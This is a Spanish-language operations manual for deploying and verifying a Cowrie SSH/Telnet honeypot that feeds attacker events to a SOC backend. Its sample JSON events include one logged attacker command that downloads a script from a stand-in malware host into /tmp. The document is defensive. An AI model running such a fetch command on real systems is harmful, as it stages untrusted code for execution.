# 📖 Valhalla SOC — Honeypot (Cowrie) — Manual de operación

> **Destinatario:** cualquiera que tenga que levantar, operar o verificar el honeypot Cowrie del SOC. No se asumen conocimientos previos de Cowrie; sí se asume Docker básico.

---

## 1. ¿Qué es este subproyecto?

Un **honeypot SSH/Telnet** independiente. Se hace pasar por un servidor Ubuntu real para atraer bots y atacantes, captura **todo** lo que hacen y lo exporta como eventos JSON línea a línea (`cowrie.json`). Esos eventos son el **input del backend FastAPI + Ollama** del SOC.

No depende del resto del stack: se puede arrancar, probar y reiniciar sin tocar Wazuh ni el backend.

```
Atacante ──► :2222 SSH ─┐
                         ├─► valhalla-cowrie (Docker) ─► logs/cowrie.json ─► Backend FastAPI
Atacante ──► :2223 Telnet ┘
```

---

## 2. Requisitos

| Requisito | Versión mínima | Comprobación |
|---|---|---|
| Docker Engine | 20.10+ | `docker --version` |
| Docker Compose v2 | 2.0+ | `docker compose version` |
| Puertos libres en el host | 2222, 2223 | `netstat -an \| findstr 2222` (Windows) / `ss -tlnp \| grep 2222` (Linux) |
| Espacio en disco | 1 GB | para la imagen + logs |
| RAM | 512 MB libres | el contenedor se limita a 512M |

### Opcional (para validación)

- `jq` — para formatear los logs JSON en tail-logs.
- `ssh` o `sshpass` — para simular ataques desde la misma máquina.

---

## 3. Instalación

Todo está ya en el repo. No hay nada que compilar. El flujo es:

```bash
# 1) Entra a la carpeta del honeypot
cd Valhalla-SOC/honeypot

# 2) (Opcional) Personaliza variables de entorno
cp .env.example .env
# edita .env si quieres cambiar puertos

# 3) Arranca
docker compose up -d
# o bien:   make up
# o bien:   bash scripts/start.sh
```

La primera vez Docker descargará la imagen `cowrie/cowrie:latest` (~200 MB).

---

## 4. Configuración

### 4.1 Puertos

Por defecto Cowrie escucha en **2222 (SSH)** y **2223 (Telnet)** del host. Los fijas en `.env`:

```ini
COWRIE_SSH_PORT=2222
COWRIE_TELNET_PORT=2223
```

> Para recibir tráfico real del puerto 22, no uses 22 directamente (requiere root y colisiona con tu SSH). Redirige con `iptables` / `nftables` / firewall del router:
>
> ```bash
> sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222
> ```

### 4.2 Credenciales señuelo (`cowrie/userdb.txt`)

Define qué combinaciones `usuario:contraseña` **dejan pasar** al atacante a la shell falsa. Formato:

```
usuario:x:contraseña          # permite
usuario:x:!contraseña         # deniega explícitamente
*:x:*                         # fallback (wildcard — debe ir último)
```

El honeypot es más útil si **deja entrar** a algunos bots: solo dentro de la shell falsa podemos capturar los comandos que ejecutan. Las credenciales actuales cubren los 50 pares más comunes en ataques de fuerza bruta (Mirai, Kinsing, RapperBot…).

### 4.3 Banner / hostname (`cowrie/cowrie.cfg`)

Las líneas que verá el atacante:

```ini
[honeypot]
hostname = production-server
kernel_version = 5.15.0-91-generic

[ssh]
version = SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6
```

Si cambias algo en `cowrie.cfg` o `userdb.txt`: **`make restart`**.

---

## 5. Operación diaria

Todos los comandos se pueden ejecutar con `make`, con los scripts de `scripts/`, o con `docker compose` directamente.

| Acción | Make | Script | Docker Compose |
|---|---|---|---|
| Arrancar | `make up` | `bash scripts/start.sh` | `docker compose up -d` |
| Parar | `make down` | `bash scripts/stop.sh` | `docker compose down` |
| Reiniciar | `make restart` | — | `docker compose restart` |
| Estado | `make status` | `bash scripts/status.sh` | `docker compose ps` |
| Logs en vivo | `make logs` | `bash scripts/tail-logs.sh` | `tail -F logs/cowrie.json` |
| Probar ataque | `make test` | `bash scripts/test-attack.sh` | — |
| Reconstruir desde cero | `make rebuild` | — | `docker compose down -v && docker compose up -d` |
| Limpiar logs locales | `make clean` | — | `rm -f logs/* downloads/*` |

### Logs humanos vs logs JSON

| Fichero | Para qué sirve |
|---|---|
| `logs/cowrie.json` | **El importante.** Una línea JSON por evento. Lo consume el backend. |
| `logs/cowrie.log` | Log humano, útil para depurar. |
| `downloads/<hash>` | Archivos que el atacante sube/baja (pueden ser malware real). |
| `tty/` | Grabaciones binarias de sesiones interactivas. Reproducibles con `cowrie-tty-player`. |

---

## 6. Cómo verificar que funciona

Checklist en 4 pasos. Tras cada paso se indica qué deberías ver.

### Paso 1 — Contenedor arriba y healthy

```bash
make status
```

Salida esperada:

```
  Contenedor : valhalla-cowrie
  Estado     : running
  Healthcheck: healthy
```

Si `Estado ≠ running`: mira `docker compose logs cowrie` y salta a **§8 Troubleshooting**.

### Paso 2 — Puertos SSH y Telnet aceptan conexiones

```bash
# Linux / macOS / WSL:
nc -vz localhost 2222          # debe decir "succeeded" o "open"
nc -vz localhost 2223

# Windows PowerShell:
Test-NetConnection localhost -Port 2222
Test-NetConnection localhost -Port 2223
```

### Paso 3 — SSH responde con el banner falso

```bash
ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@localhost
```

Prueba contraseñas del `userdb.txt` (ej. `123456`, `admin`, `toor`). Cuando entres, **estás dentro de la shell falsa**. Ejecuta:

```
$ uname -a
$ id
$ ls /
$ cat /etc/passwd
$ exit
```

Cada comando que escribas queda en `logs/cowrie.json`.

### Paso 4 — Eventos JSON se están escribiendo

Desde otra terminal mientras estás conectado por SSH:

```bash
make logs
```

Deberías ver líneas tipo:

```
2026-04-19T19:45:03.122Z    cowrie.session.connect   127.0.0.1    -        -        New connection
2026-04-19T19:45:06.455Z    cowrie.login.success     127.0.0.1    root     123456   -
2026-04-19T19:45:09.910Z    cowrie.command.input     127.0.0.1    -        -        uname -a
2026-04-19T19:45:12.301Z    cowrie.command.input     127.0.0.1    -        -        id
```

O bien el JSON crudo:

```bash
tail -n 5 logs/cowrie.json | jq .
```

### Atajo — test automatizado

Si tienes `sshpass` instalado:

```bash
make test
```

Lanza 5 intentos con credenciales típicas y te dice dónde mirar los eventos.

### Contador rápido

```bash
wc -l logs/cowrie.json            # total de eventos registrados
grep -c login.failed logs/cowrie.json
grep -c login.success logs/cowrie.json
grep -c command.input logs/cowrie.json
```

---

## 7. Estructura de los eventos JSON

Cada línea de `cowrie.json` es un objeto JSON independiente. Los `eventid` que más le interesan al backend:

| eventid | Qué significa | Campos clave |
|---|---|---|
| `cowrie.session.connect` | Llega una conexión | `src_ip`, `src_port`, `session`, `protocol` |
| `cowrie.client.version` | Cliente SSH identificado | `version` |
| `cowrie.login.failed` | Login fallido | `username`, `password`, `src_ip` |
| `cowrie.login.success` | Login aceptado (cae en la trampa) | `username`, `password`, `src_ip`, `session` |
| `cowrie.command.input` | Comando ejecutado | `input`, `src_ip`, `session` |
| `cowrie.session.file_download` | Atacante descarga algo (wget/curl) | `url`, `outfile`, `shasum` |
| `cowrie.session.file_upload` | Atacante sube algo (SCP/SFTP) | `filename`, `outfile`, `shasum` |
| `cowrie.session.closed` | Fin de sesión | `duration`, `session` |

Ejemplo real de 3 eventos consecutivos:

```json
{"eventid":"cowrie.session.connect","src_ip":"185.207.x.x","src_port":54312,"session":"a1b2c3","timestamp":"2026-04-19T19:45:03.122Z","protocol":"ssh"}
{"eventid":"cowrie.login.success","username":"root","password":"123456","src_ip":"185.207.x.x","session":"a1b2c3","timestamp":"2026-04-19T19:45:06.455Z"}
{"eventid":"cowrie.command.input","input":"wget http://malware.example/x.sh -O /tmp/x.sh","src_ip":"185.207.x.x","session":"a1b2c3","timestamp":"2026-04-19T19:45:09.910Z"}
```

El backend hará algo como:

```python
async for line in tail_follow("/var/log/cowrie/cowrie.json"):
    ev = json.loads(line)
    if ev["eventid"] in {"cowrie.command.input", "cowrie.login.success"}:
        verdict = await ollama.analyze(ev)
        await api.publish(ev, verdict)
```

---

## 8. Troubleshooting

### `docker compose up -d` falla: "port already in use"

Algo ya escucha en 2222/2223. Opciones:

```bash
# Mirar qué lo ocupa (Linux)
sudo ss -tlnp | grep :2222

# O cambiar el puerto en .env
echo "COWRIE_SSH_PORT=22222" >> .env
make restart
```

### El contenedor arranca y se cae (`Exited (1)`)

```bash
docker compose logs --tail=100 cowrie
```

Causas frecuentes:
- `cowrie.cfg` con un error de sintaxis (typo en una `[section]`).
- `userdb.txt` con una línea sin los 3 campos separados por `:`.
- Problema de permisos en el volumen (Windows): borra el volumen con `docker volume rm valhalla_cowrie_logs` y vuelve a arrancar.

### No se ven logs JSON

```bash
docker compose exec cowrie ls -la /cowrie/cowrie-git/var/log/cowrie/
```

Si no existe `cowrie.json`: el `output_jsonlog` está deshabilitado. Revisa `cowrie/cowrie.cfg`:

```ini
[output_jsonlog]
enabled = true
logfile = var/log/cowrie/cowrie.json
```

### No llegan conexiones desde fuera

El puerto 2222 debe estar abierto en tu firewall / router. Si el honeypot está en una VPS, revisa el Security Group / UFW.

### El backend no ve los logs

El backend tiene que montar **el mismo volumen nombrado** que usa Cowrie:

```yaml
# en backend/docker-compose.yml
services:
  backend:
    volumes:
      - valhalla_cowrie_logs:/var/log/cowrie:ro
    networks:
      - valhalla-net

volumes:
  valhalla_cowrie_logs:
    external: true        # ← importante
networks:
  valhalla-net:
    external: true        # ← importante
```

---

## 9. Seguridad operacional

- **Los ficheros en `downloads/` son malware real.** No los ejecutes, no hagas doble-click. Súbelos a VirusTotal si quieres análisis.
- Nunca expongas Cowrie en la misma máquina que un SSH real en el mismo puerto.
- Si ves tu IP pública en los logs con patrones de ataque, es porque **alguien te está atacando de verdad** — es lo que queremos.
- Rota/limpia `logs/` si se hace grande: `make clean` o `docker compose down -v`.

---

## 10. Integración con el resto del SOC

| Componente | Cómo consume este honeypot |
|---|---|
| **Backend FastAPI** | Monta el volumen `valhalla_cowrie_logs:ro` y hace `tail -F cowrie.json`. Filtra eventos, consulta Ollama, expone API al frontend. |
| **Wazuh Manager** (opcional) | Ya hay decoders y reglas en `../wazuh_config/` que leen el mismo log. Puede convivir con el backend. |
| **Frontend** | Consume la API del backend, no lee directamente los logs. |

El volumen y la red externos son el "pegamento":

```
valhalla_cowrie_logs  (docker volume)
      └── /cowrie/cowrie-git/var/log/cowrie/cowrie.json

valhalla-net           (docker network)
      ├── valhalla-cowrie
      ├── valhalla-backend       (lo añadirás desde backend/docker-compose.yml)
      └── valhalla-frontend
```

---

## 11. Referencias

- [Cowrie — docs oficiales](https://cowrie.readthedocs.io/)
- [Cowrie — repo GitHub](https://github.com/cowrie/cowrie)
- [Imagen Docker oficial](https://hub.docker.com/r/cowrie/cowrie)
- [MITRE ATT&CK — Técnicas aplicables](https://attack.mitre.org/techniques/T1110/) (T1110 Brute Force, T1078 Valid Accounts)
- Valhalla SOC — [README del proyecto completo](../../README.md)
